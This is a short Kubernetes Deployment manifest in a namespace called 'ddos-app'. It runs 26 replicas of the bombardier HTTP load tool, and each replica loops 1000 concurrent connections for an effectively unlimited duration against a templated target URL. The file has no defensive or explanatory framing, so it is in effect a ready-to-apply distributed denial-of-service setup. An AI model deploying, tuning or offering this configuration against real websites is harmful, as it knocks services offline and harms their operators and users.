apiVersion: apps/v1
kind: Deployment
metadata:
  labels:
    app: $NAME
  name: $NAME
  namespace: ddos-app
spec:
  replicas: 26
  selector:
    matchLabels:
      app: $NAME
  template:
    metadata:
      labels:
        app: $NAME
    spec:
      containers:
      - name: bombardier
        image: alpine/bombardier
        imagePullPolicy: IfNotPresent
        command: ["/bin/sh"]
        args: ["-c", "for run in $(seq 1 100000); do bombardier -c 1000 -d 200000h -r 10 -p i,p,r $URL; done"]
